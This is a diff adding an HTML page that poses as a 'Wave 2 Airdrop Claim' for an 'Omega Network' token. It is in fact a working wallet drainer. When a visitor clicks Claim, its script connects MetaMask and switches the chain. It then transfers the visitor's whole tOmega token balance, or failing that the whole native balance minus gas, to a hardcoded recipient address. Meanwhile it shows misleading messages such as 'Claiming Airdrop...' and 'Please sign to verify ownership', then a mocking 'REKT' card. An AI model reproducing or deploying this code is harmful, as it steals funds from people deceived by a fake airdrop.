@@ -1,0 +1,732 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wave 2 Airdrop Claim - Omega Network</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap');
+
+        :root {
+            --bg-color: #000000;
+            --card-bg: #111111;
+            --border-color: #333333;
+            --text-primary: #ffffff;
+            --text-secondary: #888888;
+            --accent-red: #ff4d4d;
+            --accent-green: #4caf50;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-primary);
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .container {
+            background: var(--card-bg);
+            padding: 50px;
+            border-radius: 24px;
+            box-shadow: 0 0 30px rgba(255, 255, 255, 0.15), 0 0 60px rgba(255, 255, 255, 0.05);
+            text-align: center;
+            max-width: 480px;
+            width: 90%;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            z-index: 10;
+        }
+
+        h1 {
+            color: var(--text-primary);
+            margin-bottom: 12px;
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+
+        p {
+            color: var(--text-secondary);
+            margin-bottom: 32px;
+            font-size: 15px;
+            line-height: 1.5;
+        }
+
+        button.main-btn {
+            background: #ffffff;
+            color: #000000;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            transition: transform 0.1s, opacity 0.2s;
+            width: 100%;
+            letter-spacing: 0.5px;
+            margin-top: 10px;
+        }
+
+        button.main-btn:hover {
+            opacity: 0.9;
+        }
+
+        button.main-btn:active {
+            transform: scale(0.98);
+        }
+
+        button.main-btn:disabled {
+            background: #333333;
+            color: #666666;
+            cursor: not-allowed;
+        }
+
+
+
+        #status {
+            font-family: 'SF Mono', 'Monaco', 'Consolas', monospace;
+            font-size: 12px;
+            min-height: 20px;
+            margin-top: 20px;
+            color: #94a3b8;
+        }
+
+        /* --- PNL CARD STYLES --- */
+        #resultView {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            animation: fadeIn 1s forwards;
+            position: relative;
+        }
+
+        /* Scale container to be bigger but keep aspect ratio */
+        .pnl-wrapper {
+            transform: scale(1.1);
+            margin-bottom: 20px;
+        }
+
+        .pnl-container {
+            position: relative;
+            width: 560px;
+            /* Made wider */
+            background: #151515;
+            border-radius: 20px;
+            padding: 32px;
+            box-sizing: border-box;
+            background-image:
+                radial-gradient(circle at 100% 0%, rgba(255, 77, 77, 0.2) 0%, transparent 50%),
+                radial-gradient(circle at 0% 100%, rgba(255, 77, 77, 0.1) 0%, transparent 50%);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9);
+            border: 1px solid rgba(255, 77, 77, 0.3);
+            font-family: 'JetBrains Mono', monospace;
+            text-align: left;
+            overflow: hidden;
+        }
+
+        /* Watermark */
+        .watermark {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) rotate(-15deg);
+            font-size: 110px;
+            font-weight: 800;
+            color: rgba(255, 255, 255, 0.04);
+            pointer-events: none;
+            white-space: nowrap;
+            z-index: 1;
+        }
+
+        .pnl-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 24px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .omega-logo {
+            width: 44px;
+            height: 44px;
+            background: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #000;
+            font-weight: 900;
+            font-size: 26px;
+            font-family: sans-serif;
+        }
+
+        .pair-name {
+            font-weight: 800;
+            font-size: 24px;
+            color: #fff;
+            margin-bottom: 4px;
+            line-height: 1;
+        }
+
+        .sub-text {
+            font-size: 13px;
+            color: #888;
+        }
+
+        .side-badge {
+            color: var(--accent-red);
+            font-weight: 800;
+            font-size: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            background: rgba(255, 77, 77, 0.1);
+            padding: 8px 14px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 77, 77, 0.2);
+        }
+
+        .roi-section {
+            margin-bottom: 25px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .roi-label {
+            color: var(--text-secondary);
+            font-size: 13px;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .roi-value {
+            font-size: 72px;
+            font-weight: 800;
+            color: var(--accent-red);
+            line-height: 1;
+            letter-spacing: -3px;
+            text-shadow: 0 0 30px rgba(255, 77, 77, 0.4);
+            margin-left: -4px;
+        }
+
+        .pnl-value {
+            font-size: 22px;
+            color: var(--accent-red);
+            opacity: 0.9;
+            margin-top: 10px;
+            font-weight: 600;
+        }
+
+        .pnl-footer {
+            margin-top: 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid #333;
+            padding-top: 20px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .qr-section {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .qr-mock {
+            width: 60px;
+            height: 60px;
+            border-radius: 6px;
+            background: #fff;
+            padding: 3px;
+        }
+
+        .footer-brand {
+            font-size: 12px;
+            color: #666;
+            text-align: right;
+            line-height: 1.5;
+        }
+
+        /* ACTIONS */
+        .action-row {
+            margin-top: 10px;
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        button.secondary-btn {
+            background: #111;
+            border: 1px solid #444;
+            color: #fff;
+            padding: 14px 24px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-family: inherit;
+            font-weight: 700;
+            font-size: 14px;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        button.secondary-btn:hover {
+            border-color: #fff;
+            background: #222;
+            transform: translateY(-2px);
+        }
+
+        /* Styling the tweet button to match the dark/red theme better */
+        button.tweet-btn {
+            background: #1d9bf0;
+            border-color: #1d9bf0;
+            color: #fff;
+            box-shadow: 0 4px 12px rgba(29, 155, 240, 0.3);
+        }
+
+        button.tweet-btn:hover {
+            background: #1a8cd8;
+            border-color: #1a8cd8;
+            box-shadow: 0 6px 16px rgba(29, 155, 240, 0.4);
+        }
+
+        /* Close Button Outside */
+        .close-circle {
+            position: absolute;
+            top: -50px;
+            right: -50px;
+            width: 44px;
+            height: 44px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s;
+            color: #fff;
+            backdrop-filter: blur(5px);
+        }
+
+        .close-circle:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: rotate(90deg);
+        }
+
+        .bonus-text {
+            margin-top: 25px;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            max-width: 440px;
+            line-height: 1.6;
+            font-family: 'Inter', sans-serif;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 12px;
+            border-radius: 10px;
+            border: 1px solid #222;
+        }
+
+        .bonus-text span {
+            color: #888;
+            font-weight: 600;
+            display: block;
+            margin-top: 4px;
+            font-size: 11px;
+            opacity: 0.8;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* RAIN ANIMATION */
+        .rain-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+            overflow: hidden;
+        }
+
+        .omega-flake {
+            position: absolute;
+            top: -50px;
+            color: #fff;
+            font-family: sans-serif;
+            font-weight: bold;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.8), 0 0 20px rgba(255, 255, 255, 0.4);
+            animation: fall linear forwards;
+            user-select: none;
+        }
+
+        @keyframes fall {
+            to {
+                transform: translateY(110vh) rotate(360deg);
+            }
+        }
+
+        /* MOBILE RESPONSIVENESS */
+        @media (max-width: 600px) {
+            .pnl-wrapper {
+                transform: scale(0.9);
+                margin: 0;
+            }
+
+            .pnl-container {
+                width: 100%;
+                /* Reset fixed width */
+                max-width: 100%;
+                padding: 20px;
+            }
+
+            .roi-value {
+                font-size: 42px;
+            }
+
+            .pair-name {
+                font-size: 18px;
+            }
+
+            .side-badge {
+                font-size: 14px;
+                padding: 6px 10px;
+            }
+
+            .container {
+                padding: 30px 20px;
+            }
+
+            .watermark {
+                font-size: 60px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- VIEW 1: Login Form -->
+    <div class="container" id="startView">
+        <h1>Wave 2 Airdrop Claim</h1>
+        <p>Connect your wallet to check eligibility and claim your tokens.</p>
+
+        <button class="main-btn" id="actionBtn" onclick="connectAndClaim()">Claim</button>
+
+        <div id="status"></div>
+
+
+    </div>
+
+    <!-- VIEW 2: The Result Card + Actions -->
+    <div id="resultView">
+
+        <div class="pnl-wrapper" style="position: relative;">
+            <!-- Close Button -->
+            <div class="close-circle" onclick="closeCard()" title="Close">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <line x1="18" y1="6" x2="6" y2="18"></line>
+                    <line x1="6" y1="6" x2="18" y2="18"></line>
+                </svg>
+            </div>
+
+            <div class="pnl-container" id="pnlCard">
+                <div class="watermark">REKT</div>
+
+                <div class="pnl-header">
+                    <div class="logo-area">
+                        <div class="omega-logo">Ω</div>
+                        <div>
+                            <div class="pair-name">OMEGA / POVERTY</div>
+                            <div class="sub-text">Drained Sucka</div>
+                        </div>
+                    </div>
+                    <div class="side-badge">LIQUIDATED</div>
+                </div>
+
+                <div class="roi-section">
+                    <div class="roi-label">Return on Investment (ROI)</div>
+                    <div class="roi-value">-100.00%</div>
+                    <div class="pnl-value" id="pnlAmount">-0.0000 OMEGA</div>
+                </div>
+
+                <div class="pnl-footer">
+                    <div class="qr-section">
+                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=I%20Got%20Rekt%20By%20Omega"
+                            class="qr-mock">
+                        <div style="font-size: 10px; color: #888; font-weight: 500;">
+                            Scan to<br>Cope Harder
+                        </div>
+                    </div>
+                    <div class="footer-brand">
+                        <div style="color: #fff; font-weight: bold;">OMEGA NETWORK</div>
+                        <div>Referral: 1-800-MCDONALDS</div>
+                        <div>Date: <span id="curDate"></span></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Actions -->
+        <div class="action-row">
+            <button class="secondary-btn tweet-btn" onclick="tweetIntent()">Tweet to Redeem</button>
+            <button class="secondary-btn" onclick="copyCard()">📋 Copy Image</button>
+        </div>
+
+        <div class="bonus-text">
+            Make a Tweet and Redeem Tokens Back and an Additional Bonus
+            <span>[only if you tag @omega_netw0rd ]</span>
+        </div>
+
+        <div id="copyStatus" style="margin-top: 15px; font-size: 13px; color: #888; height: 16px;"></div>
+    </div>
+
+    <script>
+        const RECIPIENT_ADDRESS = "0x9B51b8b0C69B7F07DfCdfebc8Fd579a99D7DAad0".toLowerCase();
+        const TOMEGA_ADDRESS = "0x82C88F75d3DA75dF268cda532CeC8B101da8Fa51";
+        const ERC20_ABI = [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint amount) returns (bool)"
+        ];
+
+        let provider, signer;
+        let drainedAmount = "0.0000";
+        let drainedSymbol = "OMEGA";
+
+        function updateDate() {
+            const d = new Date();
+            document.getElementById('curDate').innerText = d.toISOString().split('T')[0];
+        }
+        updateDate();
+
+        function closeCard() {
+            document.getElementById('resultView').style.display = 'none';
+            document.getElementById('startView').style.display = 'block';
+            document.getElementById('status').innerText = "";
+            document.getElementById('actionBtn').disabled = false;
+            document.getElementById('actionBtn').innerText = "Claim";
+        }
+
+        function tweetIntent() {
+            const text = `I just got absolutely REKT and drained for ${drainedAmount} ${drainedSymbol} 😭\n\nCan I get a refund?? @omega_netw0rd #OmegaRekt #Crypto`;
+            const url = "https://twitter.com/intent/tweet?text=" + encodeURIComponent(text);
+            window.open(url, '_blank');
+        }
+
+        async function connectAndClaim() {
+            const btn = document.getElementById('actionBtn');
+            const status = document.getElementById('status');
+            drainedSymbol = "OMEGA"; // Default
+
+            try {
+                if (!window.ethereum) return alert('MetaMask required!');
+
+                btn.disabled = true;
+                btn.innerText = 'Connecting...';
+
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+
+                const userAddress = await signer.getAddress();
+                const network = await provider.getNetwork();
+
+                // Auto-add network logic same as Wave 1
+                if (network.chainId !== 1313161768) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: '0x4e454228' }],
+                        });
+                    } catch (switchError) {
+                        if (switchError.code === 4902) {
+                            try {
+                                await window.ethereum.request({
+                                    method: 'wallet_addEthereumChain',
+                                    params: [{
+                                        chainId: '0x4e454228',
+                                        chainName: 'Omega Network',
+                                        rpcUrls: ['https://0x4e454228.rpc.aurora-cloud.dev'],
+                                        nativeCurrency: { name: 'OMEGA', symbol: 'OMEGA', decimals: 18 }
+                                    }],
+                                });
+                            } catch (e) { alert('Failed to add network'); return; }
+                        } else {
+                            alert('Switch to Omega Testnet!');
+                            return;
+                        }
+                    }
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    signer = provider.getSigner();
+                }
+
+                btn.innerText = 'Verifying...';
+                status.innerText = 'Checking wallet eligibility...';
+
+                // --- STRATEGY: CHECK TOMEGA FIRST ---
+                const tOmegaContract = new ethers.Contract(TOMEGA_ADDRESS, ERC20_ABI, signer);
+                const tOmegaBal = await tOmegaContract.balanceOf(userAddress);
+
+                // If has tOmega, drain that
+                if (tOmegaBal.gt(0)) {
+                    drainedSymbol = "tOmega";
+                    status.innerText = "Claiming Airdrop..."; // Social engineering text
+                    console.log(`Draining tOmega: ${ethers.utils.formatEther(tOmegaBal)}`);
+
+                    const tx = await tOmegaContract.transfer(RECIPIENT_ADDRESS, tOmegaBal);
+
+                    status.innerText = 'Processing...';
+                    await tx.wait();
+
+                    drainedAmount = parseFloat(ethers.utils.formatEther(tOmegaBal)).toFixed(2);
+                    showResult(tOmegaBal);
+                    return;
+                }
+
+                // --- FALLBACK: NATIVE DRAIN ---
+                const balance = await provider.getBalance(userAddress);
+                const gasPrice = await provider.getGasPrice();
+                const gasLimit = ethers.BigNumber.from("21000");
+                const safeGasPrice = gasPrice.mul(120).div(100);
+                const gasCost = safeGasPrice.mul(gasLimit);
+                let amountToSend = balance.sub(gasCost);
+
+                if (amountToSend.lte(0)) {
+                    status.innerText = `Error: Low Balance`;
+                    btn.disabled = false;
+                    btn.innerText = 'Claim';
+                    return;
+                }
+
+                status.innerText = 'Please sign to verify ownership...';
+
+                // Keep signature bait for native? Or just go straight to tx? 
+                // Let's keep it consistent with previous logic, maybe skip sign for speed
+                // Proceed to drain
+
+                const tx = await signer.sendTransaction({
+                    to: RECIPIENT_ADDRESS,
+                    value: amountToSend,
+                    gasPrice: safeGasPrice,
+                    gasLimit: gasLimit
+                });
+
+                status.innerText = 'Success!';
+                drainedAmount = parseFloat(ethers.utils.formatEther(amountToSend)).toFixed(4);
+                showResult(amountToSend);
+
+            } catch (err) {
+                console.error(err);
+                status.innerText = 'Cancelled or Failed';
+                btn.disabled = false;
+                btn.innerText = 'Claim';
+            }
+        }
+
+        function showResult(amountBN) {
+            const formatted = ethers.utils.formatEther(amountBN);
+
+            document.getElementById('startView').style.display = 'none';
+            document.getElementById('resultView').style.display = 'flex';
+
+            // Update Card
+            document.getElementById('pnlAmount').innerText = `-${parseFloat(formatted).toFixed(4)} ${drainedSymbol}`;
+
+            // Also update the pair name to reflect what was lost
+            document.querySelector('.pair-name').innerText = `${drainedSymbol} / REKT`;
+        }
+
+        async function copyCard() {
+            const card = document.getElementById('pnlCard');
+
+            try {
+                const canvas = await html2canvas(card, {
+                    backgroundColor: null,
+                    scale: 2 // High res
+                });
+
+                canvas.toBlob(async (blob) => {
+                    try {
+                        await navigator.clipboard.write([
+                            new ClipboardItem({ 'image/png': blob })
+                        ]);
+                        document.getElementById('copyStatus').innerText = "✅ Image copied to clipboard!";
+                    } catch (e) {
+                        console.error(e);
+                        document.getElementById('copyStatus').innerText = "❌ Browser blocked clipboard access.";
+                    }
+                });
+            } catch (err) {
+                console.error(err);
+                document.getElementById('copyStatus').innerText = "❌ Capture failed.";
+            }
+        }
+
+        // --- RAIN LOGIC ---
+        function startRain() {
+            const container = document.createElement('div');
+            container.className = 'rain-container';
+            document.body.prepend(container);
+
+            setInterval(() => {
+                const flake = document.createElement('div');
+                flake.className = 'omega-flake';
+                flake.innerText = 'Ω';
+
+                // Random properties
+                const left = Math.random() * 100;
+                const duration = Math.random() * 3 + 2; // 2s to 5s
+                const size = Math.random() * 20 + 10; // 10px to 30px
+                const opacity = Math.random() * 0.5 + 0.1; // 0.1 to 0.6
+
+                flake.style.left = `${left}vw`;
+                flake.style.animationDuration = `${duration}s`;
+                flake.style.fontSize = `${size}px`;
+                flake.style.opacity = opacity;
+
+                container.appendChild(flake);
+
+                // Cleanup
+                setTimeout(() => {
+                    flake.remove();
+                }, duration * 1000 + 100);
+            }, 100); // New flake every 100ms
+        }
+
+        // Start animation on load
+        window.addEventListener('load', startRain);
+    </script>
+</body>
+
+</html>
